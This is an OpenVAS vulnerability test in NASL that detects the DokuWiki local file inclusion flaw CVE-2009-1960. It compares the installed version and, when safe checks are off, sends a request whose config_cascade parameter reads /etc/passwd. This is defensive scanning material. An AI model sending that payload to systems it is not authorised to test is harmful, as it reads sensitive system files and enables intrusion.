###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dokuwiki_local_file_inc_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# DokuWiki 'doku.php' Local File Inclusion Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to include and execute arbitrary
  files from local and external resources, and can gain sensitive information
  about remote system directories when register_globals is enabled.

  Impact level: Application/System";

tag_affected = "DoKuWiki version prior to 2009-02-14b on Linux.";
tag_insight = "The flaw is due to error in 'config_cascade[main][default][]' parameter in
  'inc/init.php' is not properly verified before being used to include files
  to 'doku.php'.";
tag_solution = "Upgarde to version 2009-02-14b or later.
  http://www.dokuwiki.org/dokuwiki";
tag_summary = "This host is running DokuWiki and is prone to Local File Inclusion
  vulnerability.";

if(description)
{
  script_id(800582);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-06-19 09:45:44 +0200 (Fri, 19 Jun 2009)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_cve_id("CVE-2009-1960");
  script_bugtraq_id(35095);
  script_name("DokuWiki 'doku.php' Local File Inclusion Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check for Attack string and DoKuWiki Version");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dokuwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
  }
  script_xref(name : "URL" , value : "http://secunia.com/advisories/35218");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/8812");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/8781");
  script_xref(name : "URL" , value : "http://bugs.splitbrain.org/index.php?do=details&amp;task_id=1700");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

dokuwikiPort = get_http_port(default:80);
if(!dokuwikiPort){
  exit(0);
}

dokuVer = get_kb_item("www/" + dokuwikiPort + "/DokuWiki");
dokuVer = eregmatch(pattern:"^(.+) under (/.*)$", string:dokuVer);
if(dokuVer[2] != NULL)
{
  if(!safe_checks())
  {
    sndReq = http_get(item:string(dokuVer[2], "/doku.php?config_cascade[main]"+
                                "[default][]=/etc/passwd"), port:dokuwikiPort);
    rcvRes = http_send_recv(port:dokuwikiPort, data:sndReq);
    if("root" >< rcvRes && "bin" >< rcvRes)
    {
      security_hole(dokuwikiPort);
      exit(0);
    }
  }
}

if(dokuVer[1] == NULL){
  exit(0);
}

if(version_is_less(version:dokuVer[1], test_version:"2009.02.14b")){
  security_hole(dokuwikiPort);
}
